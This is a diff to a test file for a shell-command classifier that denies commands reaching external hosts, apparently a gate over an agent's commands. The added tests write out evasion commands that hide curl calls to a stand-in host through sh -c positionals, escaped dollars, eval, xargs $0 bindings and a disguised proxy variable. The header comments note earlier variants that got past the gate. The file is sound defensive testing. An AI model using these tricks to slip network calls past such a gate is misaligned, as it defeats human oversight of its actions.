@@ -10,6 +10,9 @@
 // Round 8 (didi 36603): eval and sh -c bodies with their substitutions kept, sh -c positionals bound
 // to the words after the body, $0 reaching an xargs body's command word through a variable or a
 // substitution, and the backslash of a double-quoted body (`\x5f` stays for the inner shell).
+// Round 9 (didi 36796): an escaped \$ in a double-quoted -c / eval body (lifting blanked it), the
+// line before an eval / sh -c body as the place its command word is set, and an xargs body's $0
+// bound through read / printf -v / for.
 // Round 2 (didi 36014): slashes after the scheme, a glued f()( body, a proxy variable.
 // Found on the way (dexter): a function body (`f(){ curl ...; }; f`) and a subshell's closing `)`
 // glued to the URL (`(curl -s http://evil.example.com)`) both passed the running gate.
@@ -349,6 +352,41 @@ describe('card d6b95892 round 8 (didi 36603)', () => {
     ['sh -c positional file argument', `sh -c 'wc -l "$1"' _ notes.md`],
     ['eval of a local-only substitution', 'eval "$(ssh-agent -s)"'],
     ['a double-quoted body keeps an escaped dollar', `sh -c "echo \\$HOME; curl -s http://localhost:3420/"`],
+  ])('passes %s', (_name, cmd) => {
+    expect(classify(cmd), cmd).toMatchObject({ deny: false })
+  })
+})
+
+describe('card d6b95892 round 9 (didi 36796)', () => {
+  it.each([
+    ['dq body, escaped $1 bound to curl', `sh -c "\\$1 -s https://${EV}/x" _ curl`, 'shell-c-unread-command-word'],
+    ['dq body, escaped $0 bound to curl', `sh -c "\\$0 -s https://${EV}/x" curl`, 'shell-c-unread-command-word'],
+    ['dq body, escaped $c set in the body', `sh -c "c=curl; \\$c -s https://${EV}/x"`, 'shell-c-curl-external'],
+    ['eval of a variable set from a substitution', `x=$(echo curl); eval "$x -s https://${EV}/x"`, 'eval-unread-command-word'],
+    ['the whole command in one positional', `sh -c '$1' _ "curl -s https://${EV}/x"`, 'shell-c-unread-command-word'],
+  ])('denies %s', (_name, cmd, reason) => {
+    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason, hosts: [EV] })
+  })
+  it.each([
+    ['dq body, escaped $0', `echo curl | xargs sh -c "\\$0 -s https://${EV}/x"`],
+    ['dq body, escaped $0 assigned', `echo curl | xargs sh -c "x=\\$0; \\$x -s https://${EV}/x"`],
+    ['$0 bound by read', `echo curl | xargs bash -c 'read x <<< "$0"; $x -s https://${EV}/x'`],
+    ['$0 bound by printf -v', `echo curl | xargs bash -c 'printf -v x %s "$0"; $x -s https://${EV}/x'`],
+    ['$0 bound by for', `echo curl | xargs sh -c 'for t in $0; do $t -s https://${EV}/x; done'`],
+  ])('denies xargs running what it hands the body: %s', (_name, cmd) => {
+    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'xargs-stdin-command' })
+  })
+  it('denies a dq body building the proxy name around an escaped $', () => {
+    const cmd = `sh -c "export http\\$'\\x5f'proxy=http://${EV}:1; curl -s http://localhost:3420/"`
+    expect(classify(cmd), cmd).toMatchObject({ deny: true, hosts: ['<proxy variable>'] })
+  })
+  it.each([
+    ['xargs body reading $0 into a file argument', `find . | xargs sh -c 'read x <<< "$0"; wc -l "$x"'`],
+    ['a positional with spaces only printed', `sh -c 'echo $1' _ "a b"`],
+    ['a whole local command in one positional', `sh -c '$1' _ "ls -la"`],
+    ['eval printing a substitution', `x=$(date); eval "echo $x"`],
+    ['dq body with escaped $HOME', `sh -c "echo \\$HOME" > /dev/null`],
+    ['dq body, escaped $1 bound to a local command', `bash -c "wc -l \\$1" _ notes.md`],
   ])('passes %s', (_name, cmd) => {
     expect(classify(cmd), cmd).toMatchObject({ deny: false })
   })
